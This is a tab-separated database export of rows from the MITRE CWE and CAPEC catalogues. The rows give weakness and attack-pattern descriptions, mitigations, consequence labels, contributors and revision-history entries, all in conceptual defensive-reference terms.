7602	62	updated Relationships, Other_Notes, Taxonomy_Mappings
13202	35	MITRE
18900	50	Use session identifiers that are difficult to guess or brute-force: One way for the attackers to obtain valid session identifiers is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult.
20459	85	107
12081	26	Operation
6848	79	Availability
8047	39	2011-06-01
24911	46	The sensitive information may be valuable information on its own (such as a password), or it may be useful for launching other, more deadly attacks. If an attack fails, an attacker may use error information provided by the server to launch another more focused attack. For example, an attempt to exploit a path traversal weakness (CWE-22) might yield the full pathname of the installed application. In turn, this could be used to select the proper number of ".." sequences to navigate to the targeted file. An attack using SQL injection (CWE-89) might not initially succeed, but an error message could reveal the malformed query, which would expose query logic and possibly even passwords or other sensitive information used within the query.
15428	33	Mark Dowd
16421	52	This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.                   Error conditions may be triggered with a stress-test by calling the software simultaneously from a large number of threads or processes, and look for evidence of any unexpected behavior.
19789	48	03
10704	26	Architecture and Design
19888	21	PLOVER
11180	70	Elaborate Ways to Exploit XSS: Flash Parameter Injection (FPI)
20798	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships, Taxonomy_Mappings
16899	62	updated Common_Consequences
19500	35	MITRE
8297	39	2014-07-30
12543	44	SOAR Partial
12182	39	2017-11-08
15730	100	The MITRE Corporation
18158	33	Rob Fergus
14684	31	699
11600	91	Implementation
20551	28	CWE Content Team
20784	101	CAPEC Content Team
7182	91	Implementation
14316	63	DoS: Crash, Exit, or Restart
6918	39	2014-07-30
14148	21	CWE Content Team
22619	39	2012-10-30
13999	47	Read Data
8929	35	MITRE
16484	62	updated Relationships
20678	39	2011-03-29
12567	54	High
10273	89	Detailed
23507	56	ChildOf
11642	43	Simple
17588	79	Confidentiality
7151	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
20774	63	Varies by Context
19460	56	ChildOf
15012	26	Implementation
22596	62	updated Time_of_Introduction
18996	72	If an action form mapping does not have a validation form defined, it may be vulnerable to a number of attacks that rely on unchecked input. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation.
19527	72	If an attacker can spoof the endpoint, the attacker gains all the privileges that were intended for the original endpoint.
7401	40	None
18137	50	Implementation: Mail servers that perform strict validation may catch these attacks, because metacharacters are not allowed in many header variables such as dns names
6637	26	Implementation
18911	35	MITRE
19873	21	CWE Content Team
23730	21	7 Pernicious Kingdoms
21109	88	Improper Neutralization of Record Delimiters
14720	31	1000
11296	35	MITRE
24087	56	ChildOf
22618	76	2015-11-09
23998	62	updated Relationships
14257	69	Incomplete
12607	35	MITRE
6494	42	Developers should anticipate that value delimiters will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
6439	39	2012-10-30
8587	35	MITRE
19227	102	ChildOf
12040	102	ChildOf
12371	62	updated Description
21189	23	The software contains a conditional statement with multiple logical expressions in which one of the non-leading expressions may produce side effects. This may lead to an unexpected state in the program after the execution of the conditional, because short-circuiting logic may prevent the side effects from occurring.
11565	35	MITRE
12148	89	Standard
22749	56	ChildOf
8799	31	1000
10964	30	Adrienne Porter Felt
7556	28	CWE Content Team
10998	32	The Wikimedia Foundation, Inc
9058	39	2009-07-27
23347	81	Integrity
9785	85	18
23146	103	Primary
22717	62	updated Relationships, Taxonomy_Mappings
17982	39	2014-06-23
15267	35	MITRE
5791	35	Cigital
6357	35	MITRE
17185	45	Variant
11499	40	The attacker will, for most circumstances, also need to be able to place code in the victim container. This does not necessarily mean that they will have to subvert host-level security, except when explicitly indicated.
19717	44	High
20381	50	Use mail.local
24220	35	MITRE
22036	32	National Institute of Standards and Technology
18645	35	MITRE
20558	35	MITRE
8981	25	High
5587	39	2009-07-27
15699	50	Implementation: The victim should configure the browser to minimize active content from untrusted sources.
9479	102	ChildOf
20665	62	updated Potential_Mitigations, Time_of_Introduction
7154	62	updated Relationships
17767	62	updated Potential_Mitigations
22426	35	MITRE
11187	54	High
11035	59	Updated Related_Attack_Patterns
6864	59	Updated Description Summary
9248	35	MITRE
9052	28	CWE Content Team
24064	95	The attacker craft malicious input data which includes escaped slashes. The attacker may need multiple attempts before finding a successful combination.
8869	101	CAPEC Content Team
13770	45	Class
21062	77	Automated Dynamic Analysis
23881	88	Improper Output Neutralization for Logs
11665	35	MITRE
14179	28	CWE Content Team
5752	35	MITRE
13445	43	Simple
6563	35	MITRE
24689	24	MITRE
12650	103	Primary
24283	28	CWE Content Team
17903	28	CWE Content Team
14522	62	updated Potential_Mitigations
20167	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
12311	104	841
12065	45	Base
14278	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
24683	31	1000
7490	39	2011-06-01
19329	62	updated Modes_of_Introduction, Observed_Examples, Relationships
24329	62	updated Relationships
7510	79	Availability
16050	39	2011-06-01
17895	28	CWE Content Team
9443	102	ChildOf
15569	103	Primary
22334	40	This type of an attack requires the attacker to know the endpoint of the web service, and be able to reach the endpoint with a malicious SOAP message.
11852	103	Primary
15522	28	Eric Dalci
19216	35	MITRE
9689	39	2011-03-29
24284	42	Make access control policy based on path information in canonical form. Use very restrictive regular expressions to validate that the path is in the expected form.
8782	40	The targeted client must access the site via infrastructure that the attacker has co-opted and must fail to adequately verify that the communication channel is operating correctly (e.g. by verifying that they are, in fact, connected to the site they intended.)
19702	28	CWE Content Team
23175	31	1000
18400	28	CWE Content Team
5598	91	Implementation
7043	35	MITRE
16160	35	MITRE
10993	31	1000
21895	31	699
19667	72	If the untrusted pointer references a memory location that is not accessible to the program, or points to a location that is "malformed" or larger than expected by a read or write operation, the application may terminate unexpectedly.
22294	39	2014-06-23
10422	103	Primary
24820	28	CWE Content Team
22587	22	06
18983	76	2017-08-04
25286	56	ChildOf
25090	43	Simple
14297	53	The MITRE Corporation
24227	62	updated Related_Attack_Patterns
22172	56	ChildOf
7433	103	Primary
20753	70	Footprinting And The Basics Of Hacking
14379	46	When including third-party functionality, such as a web widget, library, or other source of functionality, the software must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application.             This might lead to many different consequences depending on the included functionality, but some examples include injection of malware, information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware (CWE-601).
24735	67	Medium
7478	96	2018-07-02
8975	26	Operation
10687	56	ChildOf
12744	53	The MITRE Corporation
23931	63	Execute Unauthorized Code or Commands
18828	35	MITRE
18783	39	2008-07-01
19852	39	2009-03-10
12254	51	2015-11-09
16602	28	CWE Content Team
13497	23	An attacker is able to discover and query Micro-services at a web location and thereby expose the Micro-services to further exploitation by gathering information about their implementation and function. Micro-services in web pages allow portions of a page to connect to the server and update content without needing to cause the entire page to update. This allows user activity to change portions of the page more quickly without causing disruptions elsewhere. However, these micro-services may not be subject to the same level of security review as other forms of content. For example, a micro-service that posts requests to a server that are turned into SQL queries may not adequately protect against SQL-injection attacks. As a result, micro-services may provide another vector for a range of attacks. It should be emphasized that the presence of micro-services does not necessarily make a site vulnerable to attack, but they do provide additional complexity to a web page and therefore may contain vulnerabilities that support other attack patterns.
21297	79	Authorization
16613	46	This issue makes it more difficult to understand and/or maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities. This issue can make the software perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.
23530	62	updated Applicable_Platforms, Demonstrative_Examples, Modes_of_Introduction, Relationships
13737	39	2010-06-21
21837	35	MITRE
12513	56	ChildOf
12463	55	CAPEC Content Team
23672	62	updated Potential_Mitigations, Time_of_Introduction
22134	62	updated Common_Consequences
10059	39	2008-09-08
14914	28	CWE Content Team
8680	26	Build and Compilation
16768	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
12175	61	Draft
11939	26	Architecture and Design
8853	62	updated Relationships, Taxonomy_Mappings
9811	35	MITRE
23369	44	High
13371	35	MITRE
12611	35	MITRE
22595	39	2009-10-29
6284	50	Sensitive information that is part of the user state must be appropriately protected to ensure confidentiality and integrity at each request.
7126	94	A successful Communication Channel Manipulation attack can result in sensitive information exposure to the adversary, thereby compromising the communication channel's confidentiality.
19612	56	ChildOf
20936	28	CWE Content Team
16780	47	Other
9477	92	Explore
25307	56	ChildOf
19042	76	2015-11-09
24210	28	CWE Content Team
20754	47	Read Data
6629	39	2014-07-30
24834	90	C
6419	97	JSON Hijacking (aka JavaScript Hijacking)
18486	31	699
13998	45	Variant
18959	103	Primary
5835	28	CWE Content Team
23527	81	Availability
20519	86	http://ijns.femto.com.tw/contents/ijns-v12-n1/ijns-2011-v12-n1-p29-41.pdf
12381	35	MITRE
8549	91	Implementation
9206	26	Implementation
11079	62	updated Taxonomy_Mappings
12326	39	2012-05-11
10246	35	MITRE
22601	62	updated Relationships
10411	103	Primary
24940	69	Draft
8263	91	Architecture and Design
17753	35	MITRE
12994	28	CWE Content Team
19392	51	2015-11-09
23096	28	CWE Content Team
10857	23	The product uses a hashing algorithm that produces a hash value that can be used to determine the original input, or to find an input that can produce the same hash, more efficiently than brute force techniques.
16701	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
24219	39	2017-11-08
19299	50	Ensure the application is fully patched and does not allow the processing of unsigned data as if it is signed data.
13976	90	C++
6054	39	2010-02-16
25335	35	MITRE
11402	35	MITRE
17143	47	Execute Unauthorized Commands
21855	39	2010-06-21
14925	39	2017-11-08
11333	35	MITRE
17440	89	Standard
24251	39	2008-09-08
24735	69	Incomplete
18004	76	2018-07-31
13241	62	updated Applicable_Platforms, Demonstrative_Examples, Taxonomy_Mappings
21478	63	Read Application Data
10488	69	Draft
6093	43	Simple
8340	78	High
24725	73	Create the symlink to the sensitive file such as configuration files, etc.
19747	56	PeerOf
13411	28	CWE Content Team
10075	47	Read Data
6803	81	Non-Repudiation
8432	43	Simple
17164	35	MITRE
14222	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings
22268	74	2
19955	68	This is not a complete solution as it is not 100% effective.
15428	60	25
9524	28	CWE Content Team
9748	28	CWE Content Team
7906	62	updated Potential_Mitigations, References
6169	31	1000
18762	47	Modify Data
6054	28	CWE Content Team
17593	39	2011-06-01
18001	40	The target's firewall must not be configured to block egress ICMP messages.
11046	62	updated Potential_Mitigations
18736	80	Ability to read, interpret, and subsequently alter manufacturer's documentation to prevent dial-down capabilities.
8688	39	2017-01-19
18259	28	Eric Dalci
12733	88	Improper Neutralization of Multiple Internal Special Elements
20358	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
19696	72	Injection attacks are characterized by the ability to significantly change the flow of a given process, and in some cases, to the execution of arbitrary code.
15628	28	CWE Content Team
19974	81	Confidentiality
10480	28	CWE Content Team
25118	35	Cigital
6082	28	CWE Content Team
25286	31	700
23616	62	updated Causal_Nature, Demonstrative_Examples
18121	31	699
21022	28	CWE Content Team
9296	39	2010-09-09
17564	63	Reduce Maintainability
9454	40	User terminals must have a permissive access control such as world writeable that allows normal users to control data on other user's terminals.
25347	70	Flickr's API Signature Forgery Vulnerability
7357	28	CWE Content Team
21172	61	Draft
7788	28	CWE Content Team
17854	103	Primary
9242	51	2014-06-23
17173	39	2008-09-08
22542	28	CWE Content Team
21243	62	updated Demonstrative_Examples
18919	62	updated Description, Other_Notes, Potential_Mitigations
16440	28	CWE Content Team
18010	86	https://blogs.oracle.com/paulr/entry/file_descriptors_and_setuid_applications
23441	47	Execute Unauthorized Commands
22011	59	Updated Related_Attack_Patterns
12695	56	ChildOf
16813	28	Eric Dalci
8442	28	CWE Content Team
9848	59	Updated Related_Weaknesses
14886	39	2011-06-01
7320	86	http://www.openwall.com/presentations/ZeroNights2012-New-In-Password-Hashing/
19281	62	updated Common_Consequences
7361	74	1
24411	39	2019-01-03
17877	104	364
11985	74	3
8221	88	Improper Restriction of Rendered UI Layers or Frames
16198	39	2011-03-29
12932	71	2006
13355	88	Exposure of CVS Repository to an Unauthorized Control Sphere
6157	55	CAPEC Content Team
20356	35	MITRE
22371	81	Confidentiality
18004	59	Updated Attack_Prerequisites, Description Summary, References, Related_Weaknesses, Resources_Required
14365	40	The target must receive and process XML transactions.
25118	62	updated Time_of_Introduction
9959	85	292
13253	63	Quality Degradation
8772	47	Modify Data
20845	88	Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')
15169	39	2019-06-20
16897	77	Architecture or Design Review
15596	28	CWE Content Team
20672	62	updated Common_Consequences
18259	39	2008-07-01
25405	35	MITRE
20388	39	2011-06-27
16929	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
8384	28	KDM Analytics
8629	26	Implementation
7157	91	Implementation
12947	32	Aspect Security
24807	35	MITRE
25429	39	2017-11-08
13080	39	2009-03-10
12837	76	2017-05-01
12834	95	[Identify and explore caches] Use tools to sniff traffic and scan a network in order to locate application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache) that may have vulnerabilities. Look for poisoning point in cache table entries.
16197	28	CWE Content Team
13287	42	Disable or change default settings when they can be used to abuse the system. Since those default settings are shipped with the product they are likely to be known by a potential attacker who is familiar with the product. For instance, default credentials should be changed or the associated accounts should be disabled.
24915	35	MITRE
16004	26	Implementation
19019	95	[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.
10376	42	Antivirus software can help mitigate known malicious code.
20882	46	When a user can set a primary key to any value, then the user can modify the key to point to unauthorized records.             Database access control errors occur when:                                                Data enters a program from an untrusted source.                   The data is used to specify the value of a primary key in a SQL query.                   The untrusted source does not have the permissions to be able to access all rows in the associated table.
7572	49	2008
15464	28	CWE Content Team
24097	57	Indirect
22704	28	CWE Content Team
23615	26	Implementation
23520	21	PLOVER
25040	21	PLOVER
11425	35	MITRE
17563	39	2008-07-01
11390	62	updated References
7494	39	2008-09-08
8746	31	1000
18383	56	ChildOf
17976	31	1000
24911	104	209
11875	35	MITRE
9580	63	Execute Unauthorized Code or Commands
25076	103	Primary
18272	28	CWE Content Team
21334	28	CWE Content Team
11811	62	updated Description, Relationships, Taxonomy_Mappings
18184	96	2017-01-02
10436	100	The MITRE Corporation
11636	77	Automated Static Analysis
12284	28	CWE Content Team
21393	35	MITRE
17297	72	For an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffers position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences.
21882	74	1
12882	91	Architecture and Design
11820	39	2010-06-21
20173	63	Reduce Reliability
11733	101	CAPEC Content Team
13016	28	CWE Content Team
20632	39	2011-03-29
18315	39	2018-03-27
7846	89	Detailed
10602	101	CAPEC Content Team
20837	42	Use an input validation framework such as Struts.
6356	91	Architecture and Design
18596	42	Add code that fills buffers with nulls (however, the length of buffers still needs to be inspected, to ensure that the non null-terminated string is not written at the physical end of the buffer).
18206	102	ChildOf
21753	103	Primary
15878	39	2014-07-30
21059	35	MITRE
9591	91	Implementation
24451	35	MITRE
16015	92	Explore
10772	35	MITRE
6240	31	1000
23532	39	2010-02-16
19804	28	CWE Content Team
20983	40	This pattern of attack is only applicable when a downstream user leverages tokens to verify identity, and then takes action based on that identity.
24619	53	The MITRE Corporation
8942	23	If a string is passed through a filter of some kind, then a terminal NULL may not be valid. Using alternate representation of NULL allows an attacker to embed the NULL mid-string while postfixing the proper data so that the filter is avoided. One example is a filter that looks for a trailing slash character. If a string insertion is possible, but the slash must exist, an alternate encoding of NULL in mid-string may be used.
8905	39	2012-10-30
16079	28	CWE Content Team
24536	62	updated Common_Consequences, Description, Relationships, Other_Notes, Weakness_Ordinalities
16495	79	Integrity
16738	35	MITRE
21846	28	Sean Eidemiller
24077	56	ChildOf
9797	68	This is not necessarily a complete solution, since these mechanisms can only detect certain types of overflows. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.
6809	61	Stable
17562	61	Draft
16133	102	ChildOf
21282	35	MITRE
17243	28	CWE Content Team
23960	39	2017-01-19
24197	104	556
18304	28	CWE Content Team
14239	23	An attacker analyzes a binary file or executable for the purpose of discovering the structure, function, and possibly source-code of the file by using a variety of analysis techniques to effectively determine how the software functions and operates. This type of analysis is also referred to as Reverse Code Engineering, as techniques exist for extracting source code from an executable. Several techniques are often employed for this purpose, both black box and white box. The use of computer bus analyzers and packet sniffers allows the binary to be studied at a level of interactions with its computing environment, such as a host OS, inter-process communication, and/or network communication. This type of analysis falls into the 'black box' category because it involves behavioral analysis of the software without reference to source code, object code, or protocol specifications.
23031	33	Alexander Golovko
23315	31	1000
9621	28	CWE Content Team
15363	39	2009-07-27
20736	77	Manual Dynamic Analysis
9164	28	CWE Content Team
10337	55	CAPEC Content Team
25440	103	Primary
23389	103	Primary
9576	78	High
17735	23	The software does not release a resource after its effective lifetime has ended, i.e., after the resource is no longer needed.
15941	63	DoS: Resource Consumption (Other)
17437	79	Availability
10326	73	Some algorithmic techniques for secret selection may leave indicators that can be tested for relatively easily and which could then be used to eliminate large areas of the search space for consideration. For example, it may be possible to determine that a secret does or does not start with a given character after a relatively small number of tests. Alternatively, it might be possible to discover the length of the secret relatively easily. These discoveries would significantly reduce the search space, thus increasing speed with which the attacker discovers the secret.
16633	43	Simple
18086	76	2019-04-04
6249	79	Availability
12127	26	Implementation
21890	39	2011-03-29
23286	93	Limited
7675	39	2017-11-08
24491	62	updated Common_Consequences
21200	62	updated Potential_Mitigations
14806	39	2013-07-17
20412	50	Design: Use browser technologies that do not allow client side scripting.
14824	35	MITRE
23811	46	An attacker can use an ADS to hide information about a file (e.g. size, the name of the process) from a system or file browser tools such as Windows Explorer and 'dir' at the command line utility. Alternately, the attacker might be able to bypass intended access restrictions for the associated data fork.
23915	50	Configure the XML processor to only retrieve external entities from trusted sources.
8099	28	CWE Content Team
16613	43	Simple
24685	35	MITRE
22124	51	2014-06-23
10443	103	Primary
19138	28	CWE Content Team
12669	62	updated Relationships, Taxonomy_Mappings
11405	39	2009-01-12
24985	31	699
15807	28	CWE Content Team
13293	90	C++
21598	72	Access control checks for specific user data or functionality can be bypassed.
13220	40	The use of the file must be controlled by the file extension.
11977	28	CWE Content Team
9158	39	2009-10-29
24514	62	updated Related_Attack_Patterns
17846	21	CWE Content Team
14795	35	MITRE
25186	91	Implementation
13851	74	3
18550	35	MITRE
8566	45	Base
24780	23	The software performs unconditional control transfer (such as a      "goto") in code outside of a branching structure such as a switch      block.
23155	28	CWE Content Team
23600	62	updated Applicable_Platforms, Taxonomy_Mappings
14270	67	High
23016	35	MITRE
9747	56	ChildOf
14080	39	2013-02-21
7423	103	Primary
9692	59	Updated Typical_Likelihood_of_Exploit
24214	28	CWE Content Team
15483	102	ChildOf
22362	72	The data read from the system vouched for by the certificate may not be from the expected system.
10918	31	1000
18273	39	2012-05-11
7574	79	Access Control
18731	81	Confidentiality
11157	28	CWE Content Team
17698	62	updated Common_Consequences, Maintenance_Notes, Other_Notes
11606	62	updated Relationships
15051	56	ChildOf
5956	39	2009-10-29
7885	35	MITRE
17119	28	CWE Content Team
22328	89	Standard
10743	95	[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).
8733	28	Eric Dalci
15708	76	2018-07-31
17405	23	The program obtains a value from an untrusted source, converts this value to a pointer, and dereferences the resulting pointer.
9309	90	Language-Independent
17605	23	A J2EE application uses System.exit(), which also shuts down its container.
13588	28	CWE Content Team
13980	28	CWE Content Team
16502	59	Updated Resources_Required
18080	101	CAPEC Content Team
7087	35	MITRE
19180	28	CWE Content Team
6271	42	Symbolic link attacks often occur when a program creates a tmp directory that stores files/links. Access to the directory should be restricted to the program as to prevent attackers from manipulating the files.
17503	28	CWE Content Team
15042	54	High
17311	81	Confidentiality
10696	40	Encryption algorithm and key size are known.
10484	39	2014-07-30
16624	27	A tool capable of sending and receiving packets from a remote system.
7354	35	MITRE
16384	79	Availability
23018	55	CAPEC Content Team
17612	28	CWE Content Team
21460	61	Stable
19872	50	Design: Use browser technologies that do not allow client side scripting.
20714	28	CWE Content Team
18715	81	Availability
20514	51	2014-06-23
12009	28	CWE Content Team
15298	85	407
20535	73	Conduct web searching research of target. See also: CAPEC-118.
18294	91	Implementation
23719	56	ChildOf
12203	53	The MITRE Corporation
15365	26	Implementation
7229	39	2011-06-01
17112	101	CAPEC Content Team
13121	55	CAPEC Content Team
12911	56	ChildOf
18392	39	2009-05-27
9934	97	Malicious Hardware Component Replacement
7690	40	An additional HTTP entity such as an application firewall or a web caching proxy between the attacker and the second entity such as a web server
10981	81	Integrity
23873	72	Use of an index that is outside the bounds of an array will very likely result in the corruption of relevant memory and perhaps instructions, leading to a crash, if the values are outside of the valid memory area.
21764	62	updated Observed_Examples, Relationships
18390	97	WiFi MAC Address Tracking
25212	55	CAPEC Content Team
24557	62	updated Relationships
12907	59	Updated Related_Weaknesses
7064	62	updated Relationships, Taxonomy_Mappings
13238	91	Build and Compilation
8016	39	2011-06-01
18802	56	ChildOf
6548	39	2008-07-01
13949	62	updated Description
16313	39	2008-09-08
6871	92	Exploit
7791	85	268
19516	59	Updated Attack_Motivation-Consequences, Description Summary
16328	35	MITRE
5648	39	2011-06-27
7176	35	Cigital
22740	74	3
22003	31	1000
20594	56	ChildOf
24945	28	CWE Content Team
16547	76	2019-04-04
17611	100	The MITRE Corporation
17576	35	MITRE
24068	30	scut
9409	62	updated Description
21079	43	Simple
8649	92	Experiment
20306	28	CWE Content Team
11708	28	CWE Content Team
24351	62	updated Modes_of_Introduction, Relationships
14612	35	MITRE
16057	40	An attacker has access to the ciphertext.
18931	100	The MITRE Corporation
21401	79	Authorization
24640	39	2008-07-01
9355	88	Encoding Error
6910	62	updated Potential_Mitigations
7697	45	Base
18886	26	Implementation
22112	97	XML Entity Expansion
10512	28	CWE Content Team
18553	50	Employ code obfuscation techniques to prevent the adversary from reverse engineering the targeted entity.
9279	28	Eric Dalci
9623	104	476
21637	45	Variant
10765	47	Bypass Protection Mechanism
17912	35	MITRE
21286	35	Cigital
23459	103	Primary
20286	35	MITRE
16195	62	updated Taxonomy_Mappings
6658	102	CanPrecede
15898	46	An example of deploying the wrong handler would be calling a servlet to reveal source code of a .JSP file, or automatically "determining" type of the object even if it is contradictory to an explicitly specified type.
11300	35	MITRE
21549	79	Confidentiality
8521	100	The MITRE Corporation
5872	62	updated Potential_Mitigations
16972	62	updated Relationships, Taxonomy_Mappings
23532	62	updated Description, Other_Notes
18138	62	updated Potential_Mitigations
10957	28	CWE Content Team
6950	88	Use of Inherently Dangerous Function
24150	103	Primary
18490	35	MITRE
10378	23	The attacker loads and executes an arbitrary local PHP file on a target machine. The attacker could use this to try to load old versions of PHP files that have known vulnerabilities, to load PHP files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.
8731	91	Implementation
21591	62	updated Potential_Mitigations
6090	43	Simple
23362	62	updated Common_Consequences
18618	63	Gain Privileges or Assume Identity
18742	56	ChildOf
22349	100	The MITRE Corporation
16199	28	CWE Content Team
20681	39	2011-06-27
23141	81	Access Control
21381	28	CWE Content Team
10019	103	Primary
20985	39	2009-07-27
25085	39	2011-06-27
21826	25	Medium
18134	39	2017-11-08
25155	81	Other
21804	62	updated Relationships
13211	28	CWE Content Team
22998	91	Architecture and Design
11836	28	CWE Content Team
9299	56	CanPrecede
17757	70	WASC Threat Classification 2.0
22542	62	updated Common_Consequences
17940	35	MITRE
19541	51	2014-06-23
10685	62	updated Applicable_Platforms, Causal_Nature, Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, Relationships
17713	33	ASPNETUE
24662	48	08
18515	62	updated Demonstrative_Examples
6600	23	The software contains functionality that is not documented, not part of the specification, and not accessible through an interface or command sequence that is obvious to the software's users or administrators.
8579	51	2014-06-23
12767	88	Incorrect Usage of Seeds in Pseudo-Random Number Generator (PRNG)
5927	84	30
17460	42	Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, in Java, if the programmer does not explicitly initialize a variable, then the code could produce a compile-time error (if the variable is local) or automatically initialize the variable to the default value for the variable's type. In Perl, if explicit initialization is not performed, then a default value of undef is assigned, which is interpreted as 0, false, or an equivalent value depending on the context in which the variable is accessed.
10526	81	Confidentiality
8851	69	Draft
15313	35	Cigital
25027	35	MITRE
17099	35	Cigital
15587	21	Anonymous Tool Vendor (under NDA)
22164	28	CWE Content Team
10223	55	CAPEC Content Team
22195	23	The product does not check for an error after calling a function that can return with a NULL pointer if the function fails, which leads to a resultant NULL pointer dereference.
7860	39	2009-12-28
22992	59	Updated Related_Attack_Patterns
24937	62	updated References, Relationships
13754	43	Simple
11017	91	Architecture and Design
24918	53	The MITRE Corporation
25405	28	CWE Content Team
23201	23	An attacker duplicates the data on a Magnetic strip card (i.e. 'swipe card' or 'magstripe') to gain unauthorized access to a physical location or a person's private information. Magstripe cards encode data on a band of iron-based magnetic particles arrayed in a stripe along a rectangular card. Most magstripe card data formats conform to ISO standards 7810, 7811, 7813, 8583, and 4909. The primary advantage of magstripe technology is ease of encoding and portability, but this also renders magnetic strip cards susceptible to unauthorized duplication. If magstripe cards are used for access control, all an attacker need do is obtain a valid card long enough to make a copy of the card and then return the card to its location (i.e. a co-worker's desk). Magstripe reader/writers are widely available as well as software for analyzing data encoded on the cards. By swiping a valid card, it becomes trivial to make any number of duplicates that function as the original.
9385	62	updated Time_of_Introduction
15589	62	updated Description, Name
9157	62	updated Relationships
10510	35	MITRE
6560	103	Primary
13448	49	1998
11950	28	CWE Content Team
18345	35	MITRE
7702	35	MITRE
5653	62	updated Relationships
13839	73	Spider the website for all available URLs that reference a Flash application.
17106	35	Cigital
16165	97	Bypassing ATA Password Security
20874	63	Read Application Data
16907	43	Simple
6968	79	Integrity
22936	28	CWE Content Team
9641	62	updated Name
12486	31	1000
24952	72	In some cases it may be possible to delete files a malicious user might not otherwise have access to, such as log files.
19528	101	CAPEC Content Team
17244	35	MITRE
7859	54	High
7332	71	2003
14814	69	Incomplete
16571	62	updated Relationships, Observed_Example, Taxonomy_Mappings
8662	91	Implementation
24058	21	PLOVER
23967	28	CWE Content Team
16650	42	Antivirus software scans for viruses or worms.
15869	28	CWE Content Team
12942	62	updated References
10638	35	MITRE
21310	43	Simple
17565	45	Class
13852	28	CWE Content Team
12688	35	MITRE
15050	61	Draft
16197	62	updated Relationships
18010	33	Paul Roberts
19166	28	CWE Content Team
20414	35	MITRE
7854	72	The consequences can vary widely, because it depends on which objects or methods are being deserialized, and how they are used. Making an assumption that the code in the deserialized object is valid is dangerous and can enable exploitation.
5725	51	2014-06-23
12134	39	2008-07-01
20749	101	CAPEC Content Team
20070	23	A software system that accepts path input in the form of multiple internal backslash ('\multiple\trailing\\slash') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.
12991	28	Eric Dalci
7231	23	A covert channel is a path that can be used to transfer information in a way not intended by the system's designers.
22669	96	2013-06-23
24642	33	Edward W. Felten
9342	42	If possible, refactor your code so that it does not need to use eval() at all.
7401	85	541
9956	31	1000
11991	88	Signed to Unsigned Conversion Error
20945	62	updated Relationships
18841	40	System's configuration must allow an attacker to directly access executable files or upload files to execute. This means that any access control system that is supposed to mediate communications between the subject and the object is set incorrectly or assumes a benign environment.
18669	69	Incomplete
9275	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, Relationships, Taxonomy_Mappings
18613	45	Base
9241	35	Cigital
11337	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
8595	62	updated Relevant_Properties
17359	72	If the secret in a single-factor authentication scheme gets compromised, full authentication is possible.
17153	28	CWE Content Team
10726	62	updated Related_Attack_Patterns
11276	56	CanPrecede
22563	35	MITRE
14675	50	Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.
13741	39	2014-07-30
16596	28	CWE Content Team
10715	50	Ensure all input content that is delivered to client is sanitized against an acceptable content specification.
19000	28	CWE Content Team
8014	35	MITRE
14773	39	2009-10-29
6180	47	Unreliable Execution
21801	35	Cigital
21396	47	Read Data
18644	72	Logging too much information can make the log files of less use to forensics analysts and developers when trying to diagnose a problem or recover from an attack.
12329	35	MITRE
6876	61	Draft
5587	62	updated Relationship_Notes
